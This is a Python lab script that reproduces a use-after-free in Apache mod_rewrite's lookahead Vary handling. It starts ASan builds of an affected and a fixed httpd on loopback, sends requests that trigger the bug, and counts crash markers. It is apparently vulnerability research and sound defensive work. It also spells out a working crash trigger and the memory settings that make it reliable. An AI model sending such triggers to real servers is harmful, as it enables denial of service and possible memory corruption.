#!/usr/bin/env python3
"""Adjacent lane L4: CVE-2026-56154 mod_rewrite LA-U:HTTP Vary UAF.

Loopback-only differential on the L3 ASan builds. 2.4.68 is affected,
2.4.69 is the control (its fix apr_pstrdup()s ctx->vary_this before
ap_destroy_sub_req(rr)). MaxMemFree 1 makes APR return the destroyed
subrequest pool's blocks to malloc, so the stale Vary pointer faults
instead of reading recycled pool memory.

Env controls:
  RW_VARIANT=lau|plain   lookahead (%{LA-U:HTTP:X-Test}) vs plain %{HTTP:...}
  RW_HEADER=yes|none     send the X-Test request header or not
  RW_N=<int>             requests per build (default 10)

Usage:
  RW_VARIANT=lau RW_HEADER=yes RW_N=12 ./rw-lane.py 2.4.68 2.4.69
  RW_VARIANT=plain RW_HEADER=yes ./rw-lane.py 2.4.68        # control
  RW_VARIANT=lau RW_HEADER=none ./rw-lane.py 2.4.68         # control
"""
import os
import signal
import socket
import subprocess
import sys
import time

BASE = "/home/mesh-home/mishe-tauftauf2shell/lab/apache2shell"
RUN = os.path.join(BASE, "run")
LOGS = os.path.join(BASE, "logs")
DOCROOT = os.path.join(BASE, "l3", "docroot")
VARIANT = os.environ.get("RW_VARIANT", "lau")
HEADER = os.environ.get("RW_HEADER", "yes")
NREQ = int(os.environ.get("RW_N", "10"))
SUFFIX = "%s-%s" % (VARIANT, HEADER)
COND = "%{LA-U:HTTP:X-Test}" if VARIANT == "lau" else "%{HTTP:X-Test}"


def conf_for(version, port):
    root = os.path.join(BASE, "l3", "install-%s-asan" % version)
    return """ServerRoot "{root}"
PidFile "{pid}"
Listen 127.0.0.1:{port}
LoadModule authn_core_module modules/mod_authn_core.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule authz_host_module modules/mod_authz_host.so
LoadModule unixd_module modules/mod_unixd.so
LoadModule mime_module modules/mod_mime.so
LoadModule log_config_module modules/mod_log_config.so
LoadModule rewrite_module modules/mod_rewrite.so
ServerName localhost
ErrorLog "{err}"
LogLevel info rewrite:trace5
MaxMemFree 1
DocumentRoot "{docroot}"
<Directory "{docroot}">
    Require all granted
</Directory>
RewriteEngine On
RewriteCond {cond} ^yes$
RewriteRule ^/index\\.html$ - [L]
""".format(root=root,
           pid=os.path.join(RUN, "rw-%s-%s.pid" % (version, SUFFIX)),
           port=port,
           err=os.path.join(LOGS, "rw-%s-%s-error.log" % (version, SUFFIX)),
           docroot=DOCROOT, cond=COND)


def stop(pidfile):
    if not os.path.exists(pidfile):
        return
    for line in open(pidfile):
        try:
            os.kill(int(line.strip()), signal.SIGTERM)
        except (ValueError, ProcessLookupError):
            pass
    for _ in range(30):
        if not os.path.exists(pidfile):
            return
        time.sleep(0.1)
    try:
        os.unlink(pidfile)
    except FileNotFoundError:
        pass


def request(port):
    s = socket.create_connection(("127.0.0.1", port), timeout=5)
    hdr = "" if HEADER == "none" else "X-Test: yes\r\n"
    req = ("GET /index.html HTTP/1.1\r\nHost: localhost\r\n" + hdr
           + "Connection: close\r\n\r\n")
    s.sendall(req.encode())
    data = b""
    while True:
        b = s.recv(65536)
        if not b:
            break
        data += b
    s.close()
    return data


def probe(version, port):
    err = os.path.join(LOGS, "rw-%s-%s-error.log" % (version, SUFFIX))
    conf = os.path.join(RUN, "rw-%s-%s.conf" % (version, SUFFIX))
    pidf = os.path.join(RUN, "rw-%s-%s.pid" % (version, SUFFIX))
    open(conf, "w").write(conf_for(version, port))
    if os.path.exists(err):
        os.unlink(err)
    stop(pidf)
    httpd = os.path.join(BASE, "l3", "install-%s-asan" % version, "bin", "httpd")
    srv = subprocess.Popen([httpd, "-f", conf],
                           stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    time.sleep(1.5)
    statuses = []
    for _ in range(NREQ):
        try:
            r = request(port)
            statuses.append(r.split(b"\r\n", 1)[0].decode(errors="replace"))
        except Exception as e:
            statuses.append("ERR:%s" % e)
    stop(pidf)
    try:
        srv.wait(timeout=10)
    except subprocess.TimeoutExpired:
        srv.kill()
        srv.wait()
    out = srv.stdout.read().decode(errors="replace")
    log = ""
    if os.path.exists(err):
        log = open(err, errors="replace").read()
    crashes = log.count("exit signal Segmentation fault")
    print("=== %s port %d variant=%s header=%s ===" % (
        version, port, VARIANT, HEADER))
    print("statuses:", statuses[:3], "...")
    print("child SEGV count:", crashes, "srv rc:", srv.returncode)
    hay = log + out
    for needle in ("heap-use-after-free", "AddressSanitizer", "runtime error",
                   "SEGV", "vary_this", "mod_rewrite"):
        print("  %-22s : %d" % (needle, hay.count(needle)))
    return hay


if __name__ == "__main__":
    versions = sys.argv[1:] or ["2.4.68", "2.4.69"]
    ports = {"2.4.68": 7278, "2.4.69": 7279}
    for v in versions:
        hay = probe(v, ports[v])
        tag = os.path.join(LOGS, "rw-smoke-%s-%s.txt" % (v, SUFFIX))
        open(tag, "w").write(hay)
        print("saved ->", tag)
